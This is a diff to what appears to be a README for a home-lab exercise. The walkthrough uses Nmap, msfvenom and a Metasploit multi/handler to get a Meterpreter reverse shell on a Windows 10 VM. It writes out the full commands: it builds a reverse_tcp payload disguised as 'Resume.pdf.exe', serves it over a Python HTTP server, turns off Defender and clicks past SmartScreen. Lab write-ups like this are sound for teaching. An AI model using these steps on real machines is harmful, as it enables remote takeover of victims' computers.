@@ -33,7 +33,7 @@ Scan the target with Nmap
 From Kali Linux, perform an Nmap scan against the Windows victim to discover open ports.
 Command: nmap 192.168.20.10 -Pn
 Result: Port 3389/tcp (RDP — ms-wbt-server) is open, confirming the host is alive and reachable.<br/>
-<img src="https://imgur.com/Screenshot__129_" height="80%" width="80%" alt="Nmap scan results showing port 3389 open"/>
+<img width="1366" height="191" alt="Screenshot (129)" src="https://github.com/user-attachments/assets/1a034f48-0d80-4703-9120-4932a96205f2" />
 
 
 
@@ -46,7 +46,7 @@ Review msfvenom options and available payloads
 
 Run msfvenom --help to review payload crafting syntax, then msfvenom -l payloads to browse available Windows payloads.
 The payload windows/x64/meterpreter/reverse_tcp was selected — a staged Meterpreter shell that calls back to the attacker.<br/>
-<img src="https://imgur.com/Screenshot__131_" height="80%" width="80%" alt="msfvenom help menu"/>
+<img width="1366" height="619" alt="Screenshot (131)" src="https://github.com/user-attachments/assets/1b7b50f9-510b-48b7-a98a-9b1288f47f88" />
 
 
 
@@ -56,7 +56,7 @@ The payload windows/x64/meterpreter/reverse_tcp was selected — a staged Meterp
 Identify the correct payload
 
 From the payload list, locate and confirm windows/x64/meterpreter/reverse_tcp — highlighted as the chosen staged reverse TCP Meterpreter payload.<br/>
-<img src="https://imgur.com/Screenshot__132_" height="80%" width="80%" alt="msfvenom payload list highlighting windows/x64/meterpreter/reverse_tcp"/>
+<img width="1366" height="509" alt="Screenshot (132)" src="https://github.com/user-attachments/assets/bff20610-b855-4a2b-8410-54000e9af87f" />
 
 
 
@@ -73,7 +73,7 @@ Command:
      msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.20.11 lport=4444 -f exe -o Resume.pdf.exe
 
 Output: Resume.pdf.exe saved successfully (238,080 bytes).<br/>
-<img src="https://imgur.com/Screenshot__134_" height="80%" width="80%" alt="msfvenom generating Resume.pdf.exe payload"/>
+<img width="1366" height="134" alt="Screenshot (134)" src="https://github.com/user-attachments/assets/42d09ac4-53ef-4b34-9cbf-6f98f13de9b3" />
 
 
 <br />
@@ -84,7 +84,8 @@ Launch Metasploit Framework
 
 Open a terminal on Kali Linux and run msfconsole.
 Navigate to exploit/multi/handler to set up the reverse shell listener.<br/>
-<img src="https://imgur.com/Screenshot__138_" height="80%" width="80%" alt="Metasploit msfconsole launched"/>
+<img width="1366" height="607" alt="Screenshot (138)" src="https://github.com/user-attachments/assets/b2794475-8f91-4098-9080-f0df10cf72b3" />
+
 
 
 
@@ -102,7 +103,8 @@ Inside Metasploit, run:
      show options
 
 Confirm the payload is set correctly.<br/>
-<img src="https://imgur.com/Screenshot__141_" height="80%" width="80%" alt="Metasploit multi/handler payload configured"/>
+<img width="1366" height="371" alt="Screenshot (141)" src="https://github.com/user-attachments/assets/9b3f14af-0c9e-439c-b9f8-579d4c650777" />
+
 
 
 <br />
@@ -117,7 +119,8 @@ Set the attacker's IP as the listener address:
      show options
 
 Confirm: LHOST = 192.168.20.11, LPORT = 4444.<br/>
-<img src="https://imgur.com/Screenshot__143_" height="80%" width="80%" alt="LHOST and LPORT options confirmed"/>
+<img width="1017" height="73" alt="Screenshot (143)" src="https://github.com/user-attachments/assets/8eb0c488-fe5a-485a-89dd-0040e52f19fe" />
+
 
 
 <br />
@@ -126,7 +129,6 @@ Start the listener
 
 Run the handler: run
 Output: [*] Started reverse TCP handler on 192.168.20.11:4444<br/>
-<img src="https://imgur.com/Screenshot__146_" height="80%" width="80%" alt="Reverse TCP handler started and listening"/>
 
 
 
@@ -144,7 +146,8 @@ On Kali Linux Desktop, confirm Resume.pdf.exe is present with ls, then start a w
      python3 -m http.server 9999
 
 Output: Serving HTTP on 0.0.0.0 port 9999<br/>
-<img src="https://imgur.com/Screenshot__148_" height="80%" width="80%" alt="Python HTTP server hosting Resume.pdf.exe on port 9999"/>
+<img width="1366" height="110" alt="Screenshot (148)" src="https://github.com/user-attachments/assets/ff1357d4-e673-45e6-b4fc-7c454d862eb2" />
+
 
 
 <br />
@@ -152,8 +155,8 @@ Output: Serving HTTP on 0.0.0.0 port 9999<br/>
 Download the payload on the victim machine
 
 On the Windows 10 VM, open Microsoft Edge (InPrivate) and navigate to 192.168.20.11:9999.
-The directory listing shows Resume.pdf.exe — click to download.<br/>
-<img src="https://imgur.com/Screenshot__149_" height="80%" width="80%" alt="Victim downloading Resume.pdf.exe from attacker HTTP server"/>
+The directory listing shows Resume.pdf.exe — click to download. (Make sure Microsoft Defender is off on Windows 10 VM.)<br/>
+<img width="1366" height="605" alt="Screenshot (151)" src="https://github.com/user-attachments/assets/321f841d-2f09-4eef-9162-45d5e1e582db" />
 
 
 
@@ -164,7 +167,8 @@ Execute the payload — bypass SmartScreen
 
 Open the downloaded file. Windows SmartScreen warns the publisher is unknown.
 Click Run to proceed, simulating a victim who ignores the security warning.<br/>
-<img src="https://imgur.com/Screenshot__151_" height="80%" width="80%" alt="SmartScreen warning — Run clicked to execute payload"/>
+<img width="1366" height="616" alt="Screenshot (153)" src="https://github.com/user-attachments/assets/3bcb1881-b293-4fdc-a10a-4d8be37412d9" />
+
 
 
 
